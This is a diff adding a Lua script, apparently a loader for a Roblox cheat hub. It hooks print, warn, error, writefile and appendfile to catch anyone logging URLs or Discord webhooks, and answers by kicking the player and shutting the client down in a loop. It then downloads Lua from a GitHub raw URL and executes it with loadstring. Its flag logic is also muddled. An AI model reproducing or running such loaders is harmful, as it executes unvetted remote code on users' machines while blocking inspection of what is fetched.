@@ -1,0 +1,72 @@
+_G.httpdetected,_G.Antidettected = true,false
+local oldwrite, oldappend
+local function crashClient()
+    if _G.Antidettected then
+        while true do
+        game.Players.LocalPlayer:Kick("HTTP spying detected.")
+        game:Shutdown()
+    end
+    end
+end
+if _G.httpdetected then
+game.DescendantAdded:Connect(function(c)
+    if c and (c:IsA('TextLabel') or c:IsA('TextButton') or c:IsA('Message')) then
+  if string.find(string.lower(c.Text), 'http') or string.find(string.lower(c.Text), 'Http') or string.find(string.lower(c.Text), 'HTTP') then
+            _G.Antidettected = true
+            crashClient()
+  else
+            _G.Antidettected = false
+            _G.httpdetected = false
+        end
+    end
+end)
+end
+spawn(function()
+    if _G.Antidettected then
+    while true do
+        game.Players.LocalPlayer:Kick("HTTP spying detected.")
+        game:Shutdown()
+    end
+end
+end)
+hookfunction(print, function(a)
+if string.find(a:lower(), "http") or string.find(a:lower(), "Http") then
+    crashClient()
+end
+end)
+hookfunction(warn, function(a)
+if string.find(a:lower(), "http") or string.find(a:lower(), "Http") then
+    crashClient()
+end
+end)
+hookfunction(error, function(a)
+if string.find(a:lower(), "http") or string.find(a:lower(), "Http") then
+    crashClient()
+end
+end)
+    
+    oldwrite = hookfunction(writefile, function(file, content)
+        if(string.find(string.lower(content), 'http') or string.find(string.lower(content), '//') or string.find(string.lower(content), 'https://discord.com/api/webhooks/')) then
+            crashClient()
+            return
+        end
+    
+        return oldwrite(file, content)
+    end)
+
+    oldappend = hookfunction(appendfile, function(file, content)
+        if(string.find(string.lower(content), 'http') or string.find(string.lower(content), '//') or string.find(string.lower(content), 'https://discord.com/api/webhooks/')) then
+            crashClient()
+            return
+        end
+        return oldappend(file, content)
+    end)
+
+local function disableCrashClient()
+    if not _G.httpdetected then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/m1M-Plqer819/synx/main/Mbm%20Hub/-_-.lua"))()
+    end
+end
+
+task.wait(5)
+disableCrashClient()
